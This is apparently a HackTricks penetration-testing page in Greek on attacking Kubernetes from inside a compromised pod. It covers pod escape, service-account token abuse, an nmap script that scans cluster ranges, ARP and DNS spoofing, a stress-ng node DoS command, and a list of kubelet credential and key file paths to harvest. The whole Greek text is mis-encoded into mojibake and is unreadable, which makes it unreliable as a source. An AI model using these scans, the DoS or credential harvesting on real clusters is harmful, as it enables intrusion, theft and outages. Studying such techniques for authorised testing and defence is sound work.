# Î•Ï€Î¯Î¸ÎµÏƒÎ· ÏƒÏ„Î¿ Kubernetes Î±Ï€ÏŒ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± Pod

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ÏƒÏ„Î·Î½ ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Îµ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs** ÏƒÏ„Î± [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## **ÎˆÎ¾Î¿Î´Î¿Ï‚ Î±Ï€ÏŒ Ï„Î¿ Pod**

**Î‘Î½ ÎµÎ¯ÏƒÏ„Îµ Î±ÏÎºÎµÏ„Î¬ Ï„Ï…Ï‡ÎµÏÎ¿Î¯, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÏÎ±Ï€ÎµÏ„ÎµÏÏƒÎµÏ„Îµ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Î”ÏÎ±Ï€Î­Ï„ÎµÏ…ÏƒÎ· Î±Ï€ÏŒ Ï„Î¿ pod

Î“Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î´ÏÎ±Ï€ÎµÏ„ÎµÏÏƒÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î± pods, Î¯ÏƒÏ‰Ï‚ Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± **ÎµÎ¾ÎµÎ»Î¯Î¾ÎµÏ„Îµ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±** Ï€ÏÏÏ„Î±, Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î³Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ **Î´Î¹Î±ÏÏÎ®Î¾ÎµÎ¹Ï‚ docker Î³Î¹Î± Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î½Î± Î´ÏÎ±Ï€ÎµÏ„ÎµÏÏƒÎµÏ„Îµ** Î±Ï€ÏŒ Î­Î½Î± pod Ï€Î¿Ï… Î­Ï‡ÎµÏ„Îµ Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Kubernetes

ÎŒÏ€Ï‰Ï‚ ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± Î³Î¹Î± Ï„Î·Î½ **Î±Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· Ï„Î¿Ï… kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Î£Ï…Î½Î®Î¸Ï‰Ï‚ Ï„Î± pods Ï„ÏÎ­Ï‡Î¿Ï…Î½ Î¼Îµ Î­Î½Î± **token Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚** Î¼Î­ÏƒÎ± ÏƒÎµ Î±Ï…Ï„Î¬. Î‘Ï…Ï„ÏŒÏ‚ Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹Î± **Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î± Î¼Îµ Î±Ï…Ï„ÏŒÎ½** Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± **ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ** Î³Î¹Î± Î½Î± **Î¼ÎµÏ„Î±ÎºÎ¹Î½Î·Î¸ÎµÎ¯Ï„Îµ** ÏƒÎµ Î¬Î»Î»Î± pods Î® Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î½Î± **Î´ÏÎ±Ï€ÎµÏ„ÎµÏÏƒÎµÏ„Îµ** Ï€ÏÎ¿Ï‚ Ï„Î¿Ï…Ï‚ ÎºÏŒÎ¼Î²Î¿Ï…Ï‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ cluster. Î”ÎµÎ¯Ï„Îµ Ï€ÏÏ‚ ÏƒÏ„Î¿:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ Î£Ï„Î¿ Cloud

Î‘Î½ Ï„Î¿ pod Ï„ÏÎ­Ï‡ÎµÎ¹ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± **Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ cloud** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î¹Î±ÏÏÎµÏÏƒÎµÏ„Îµ Î­Î½Î± Ï„Î¿ÎºÎ­Î½ Î±Ï€ÏŒ Ï„Î¿ Ï„Î­Î»ÎµÎ¹Î¿ Î¼ÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** ÎºÎ±Î¹ Î½Î± ÎµÎ¾ÎµÎ»Î¯Î¾ÎµÏ„Îµ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿.

## Î‘Î½Î±Î¶Î®Ï„Î·ÏƒÎ· ÎµÏ…Î¬Î»Ï‰Ï„Ï‰Î½ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ Î´Î¹ÎºÏ„ÏÎ¿Ï…

ÎšÎ±Î¸ÏÏ‚ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Kubernetes, Î±Î½ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ¾ÎµÎ»Î¯Î¾ÎµÏ„Îµ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÎºÎ±Ï„Î±Ï‡ÏÎ·ÏƒÏ„Î¹ÎºÎ¬ Ï„Î± Ï„ÏÎ­Ï‡Î¿Î½Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï„Ï‰Î½ pods ÎºÎ±Î¹ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÏÎ±Ï€ÎµÏ„ÎµÏÏƒÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ container, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ Ï€Î¹Î¸Î±Î½Î¬ ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚.**

### Î¥Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚

**Î“Î¹Î± Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÏƒÎºÎ¿Ï€ÏŒ, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î»Î¬Î²ÎµÏ„Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Ï„Î¿Ï… Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ kubernetes:**
```
kubectl get svc --all-namespaces
```
Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î±, Ï„Î¿ Kubernetes Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î­Î½Î± ÎµÏ€Î¯Ï€ÎµÎ´Î¿ Î´Î¹ÎºÏ„ÏÏ‰ÏƒÎ·Ï‚ ÎµÏ€Î¯Ï€ÎµÎ´Î¿, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ **ÏŒÏ„Î¹ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ pod/service ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… cluster Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½ÎµÎ¯ Î¼Îµ Î¬Î»Î»Î±**. Î¤Î± **namespaces** ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… cluster **Î´ÎµÎ½ Î­Ï‡Î¿Ï…Î½ ÎºÎ±Î¼Î¯Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÏ„Î¹ÎºÎ® Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î± Î´Î¹ÎºÏ„ÏÎ¿Ï…**. ÎŸÏ€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ ÏƒÏ„Î¿ namespace Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½ÎµÎ¯ Î¼Îµ Î¬Î»Î»Î± namespaces.

### Î£Î¬ÏÏ‰ÏƒÎ·

Î¤Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Bash (Ï€Î¿Ï… Ï€ÏÎ¿Î­ÏÏ‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î± [ÎµÏÎ³Î±ÏƒÏ„Î®ÏÎ¹Î¿ Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) Î¸Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÎ¹ ÎºÎ±Î¹ Î¸Î± ÏƒÎ±ÏÏÏƒÎµÎ¹ Ï„Î¹Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ IP Ï„Î¿Ï… cluster Kubernetes:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Î¡Î¯Î¾Ï„Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÏ„Î·Î½ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î· ÏƒÎµÎ»Î¯Î´Î± Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ **Î½Î± ÎµÏ€Î¹Ï„ÎµÎ¸ÎµÎ¯Ï„Îµ ÏƒÎµ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Ï„Î¿Ï… Kubernetes** Î³Î¹Î± **Î½Î± Î´Î¹Î±ÎºÎ¹Î½Î´Ï…Î½ÎµÏÏƒÎµÏ„Îµ Î¬Î»Î»Î± pods/Î¿Î»ÏŒÎºÎ»Î·ÏÎ¿ Ï„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### ÎšÎ±Ï„Î±Î³ÏÎ±Ï†Î®

Î£Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… Ï„Î¿ **Ï…Ï€Î¿Î²Î±Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î¿ pod ÎµÎºÏ„ÎµÎ»ÎµÎ¯ ÎºÎ¬Ï€Î¿Î¹Î± ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î±** ÏŒÏ€Î¿Ï… Î¬Î»Î»Î± pods Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½, ÎµÎ½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï€Î¿Ï… ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î± Î¬Î»Î»Î± pods **ÎºÎ±Ï„Î±Î³ÏÎ¬Ï†Î¿Î½Ï„Î±Ï‚ Ï„Î¹Ï‚ Ï„Î¿Ï€Î¹ÎºÎ­Ï‚ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯ÎµÏ‚**.

## Î”Î¹Î±ÎºÎ¯Î½Î´Ï…Î½ÎµÏ…ÏƒÎ· Î”Î¹ÎºÏ„ÏÎ¿Ï…

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ ÏŒÏ€Ï‰Ï‚ Î· **Î´Î¹Î±ÎºÎ¯Î½Î´Ï…Î½ÎµÏ…ÏƒÎ· ARP** (ÎºÎ±Î¹ Ï‡Î¬ÏÎ· ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï„Î· **Î´Î¹Î±ÎºÎ¯Î½Î´Ï…Î½ÎµÏ…ÏƒÎ· DNS**) Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÎ½ ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿ Ï„Î¿Ï… Kubernetes. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± pod, Î±Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î· **Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± NET\_RAW** (Î· Î¿Ï€Î¿Î¯Î± Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®), Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¼Î­Î½Î± Ï€Î±ÎºÎ­Ï„Î± Î´Î¹ÎºÏ„ÏÎ¿Ï… ÎºÎ±Î¹ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ **ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ MitM Î¼Î­ÏƒÏ‰ Î´Î¹Î±ÎºÎ¯Î½Î´Ï…Î½ÎµÏ…ÏƒÎ·Ï‚ ARP ÏƒÎµ ÏŒÎ»Î± Ï„Î± pods Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ ÎºÏŒÎ¼Î²Î¿.**\
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Î½ Ï„Î¿ **ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ pod** ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿Î½ **Î¯Î´Î¹Î¿ ÎºÏŒÎ¼Î²Î¿ Î¼Îµ Ï„Î¿Î½ Î”Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® DNS**, Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± **ÎµÏ€Î¯Î¸ÎµÏƒÎ· DNS Spoofing ÏƒÎµ ÏŒÎ»Î± Ï„Î± pods ÏƒÏ„Î¿ cluster**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

Î”ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Ï€ÏŒÏÏ‰Î½ ÏƒÏ„Î± Î±ÏÏ‡ÎµÎ¯Î± Î¼ÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï„Î¿Ï… Kubernetes ÎºÎ±Î¹ **Î´ÎµÎ½ ÎµÏ†Î±ÏÎ¼ÏŒÎ¶Î¿Î½Ï„Î±Î¹ Î¿ÏÎ¯Î± Ï€ÎµÏÎ¹Î¿Ï‡ÏÎ½** Î³Î¹Î± Ï„Î¿Ï…Ï‚ containers. Î©Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Î¹, Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ **Î½Î± ÎºÎ±Ï„Î±Î½Î±Î»ÏÏƒÎ¿Ï…Î¼Îµ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ Ï€ÏŒÏÎ¿Ï…Ï‚ ÏŒÏ€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ pod/deployment** ÎºÎ±Î¹ Î½Î± Î±Ï†Î±Î¹ÏÎ­ÏƒÎ¿Ï…Î¼Îµ Ï€ÏŒÏÎ¿Ï…Ï‚ Î±Ï€ÏŒ Î¬Î»Î»Î± ÎºÎ±Î¹ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± DoS ÏƒÏ„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½.

Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î³Î¯Î½ÎµÎ¹ Î¼Îµ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î· Î´Î¹Î±Ï†Î¿ÏÎ¬ ÎµÎ½Ï Ï„ÏÎ­Ï‡ÎµÎ¹ Ï„Î¿ `stress-ng` ÎºÎ±Î¹ Î¼ÎµÏ„Î¬
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## ÎœÎµÏ„Î¬ Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î¿Ï… Node

Î‘Î½ ÎºÎ±Ï„Î±Ï†Î­ÏÎµÏ„Îµ Î½Î± **Î´ÏÎ±Ï€ÎµÏ„ÎµÏÏƒÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ container** Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î¼ÎµÏÎ¹ÎºÎ¬ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î± Ï€ÏÎ¬Î³Î¼Î±Ï„Î± Ï€Î¿Ï… Î¸Î± Î²ÏÎµÎ¯Ï„Îµ ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿:

* Î— Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± **Container Runtime** (Docker)
* Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± **pods/containers** Ï€Î¿Ï… Ï„ÏÎ­Ï‡Î¿Ï…Î½ ÏƒÏ„Î¿Î½ ÎºÏŒÎ¼Î²Î¿ ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÏŒÏ€Ï‰Ï‚ Î±Ï…Ï„ÏŒ (Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± tokens)
* ÎŸÎ»ÏŒÎºÎ»Î·ÏÎ¿ Ï„Î¿ **ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½** ÎºÎ±Î¹ Ï„Î¿ **Î›Î£** Î³ÎµÎ½Î¹ÎºÎ¬
* Î¤Î¿ **Î¥Ï€Î·ÏÎµÏƒÎ¯Î± Kube-Proxy** Ï€Î¿Ï… Î±ÎºÎ¿ÏÎµÎ¹
* Î— **Î¥Ï€Î·ÏÎµÏƒÎ¯Î± Kubelet** Ï€Î¿Ï… Î±ÎºÎ¿ÏÎµÎ¹. Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½:
* ÎšÎ±Ï„Î¬Î»Î¿Î³Î¿Ï‚: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Î†Î»Î»Î± **ÎºÎ¿Î¹Î½Î¬ Î±ÏÏ‡ÎµÎ¯Î± Kubernetes**:
* `$HOME/.kube/config` - **Î¡Ï…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Î§ÏÎ®ÏƒÏ„Î·**
* `/etc/kubernetes/kubelet.conf`- **ÎšÎ±Î½Î¿Î½Î¹ÎºÎ­Ï‚ Î¡Ï…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Î¡Ï…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ Bootstrap**
* `/etc/kubernetes/manifests/etcd.yaml` - **Î¡Ï…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ etcd**
* `/etc/kubernetes/pki` - **ÎšÎ»ÎµÎ¹Î´Î¹Î¬ Kubernetes**

### Î•ÏÏÎµÏƒÎ· node kubeconfig

Î‘Î½ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ kubeconfig ÏƒÎµ Î­Î½Î±Î½ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î± ÏƒÏ‡Î¿Î»Î¹Î±ÏƒÎ¼Î­Î½Î¿Ï…Ï‚ Î´Î¹Î±Î´ÏÏŒÎ¼Î¿Ï…Ï‚, **ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¿ ÏŒÏÎ¹ÏƒÎ¼Î± `--kubeconfig` Ï„Î·Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
